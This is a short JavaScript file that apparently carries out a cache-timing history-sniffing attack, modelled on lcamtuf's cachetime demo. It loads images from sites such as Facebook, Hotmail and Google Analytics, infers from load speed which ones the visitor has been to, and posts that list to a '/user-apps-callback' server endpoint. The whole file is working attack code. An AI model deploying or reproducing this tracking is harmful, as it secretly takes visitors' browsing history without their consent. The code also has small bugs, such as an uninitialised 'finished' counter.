
var apps = [
  { 'name': 'custom-facebook', 'urls': [ 'http://staticxx.facebook.com/connect/xd_arbiter.php?version=42' ] },
  { 'name': 'google analytics', 'urls': [ 'https://www.google-analytics.com/analytics.js' ] },
  { 'name': 'pandora', 'urls': [ 'http://www.pandora.com/img/pandora-logo-splash-538x110.png' ] },
  { 'name': 'hackernews', 'urls': [ 'https://news.ycombinator.com/y18.gif' ] },
  { 'name': 'common icons', 'urls': [ 'https://a.gfx.ms/hig/img/controls.png' ] },
  { 'name': 'hotmail', 'urls': [ 'https://col128.mail.live.com/ol/clear.gif' ] },
  { 'name': 'not a real link', 'urls': [ 'https://www.aslibjl.com' ] },
  { 'name': 'lcamtuf favicon', 'urls': [ 'http://lcamtuf.coredump.cx/favicon.ico' ] },
  { 'name': 'rubyonrails.org', 'urls': [ 'http://guides.rubyonrails.org/images/favicon.ico'  ] },
  { 'name': 'bob', 'urls': [ 'http://bob.com/images/topline-logo.jpg' ] }
];

if (navigator.userAgent.indexOf('Chrome/') == -1 && navigator.userAgent.indexOf('Opera/') == -1) {
  alert('This application is specific to Chrome and Opera, and probably won\'t work for you.\n\n' +
    'See the original project for versions for other browsers:\n' + 'http://lcamtuf.coredump.cx/cachetime/');
}

visitedApps = [];
var start = new Date().getTime();

var endCB = function () {
  console.log('tested' + apps.length + 'urls in ' + (new Date().getTime() - start) + ' milliseconds');
  $.ajax({
    type: 'post',
    url: '/user-apps-callback',
    data: visitedApps
  });
};

function testApplicationUrls(apps) {
  for (i = 0; i < apps.length; i++) {
    url = apps[i]['urls'][0];
    test_app_url(apps[i], function(app) {
      addTestResult(app);
      if (finished == apps.length) {
        endCB();
      }
    });
  }
}

function addTestResult(application) {
  visitedApps.push(application);
}

function test_app_url(app, callbackAddApp) {
  var img = new Image();
  try { img.src = app['urls'][0]; } catch(e) { alert('caught an error'); console.log(e); }
  var checks = 0;

  var imageChecker = setInterval(function() {
    checkImage(img, app, function() {
      finished++;
      delete img;
      clearInterval(imageChecker);
    })
  }, 1);

  function checkImage(img, app, stopImageChecker) {
    if (img.complete) {
      stopImageChecker();
      callbackAddApp(app);
    } else if (checks > 10) {
      stopImageChecker();
    } else {
      checks ++;
    }
  }
}
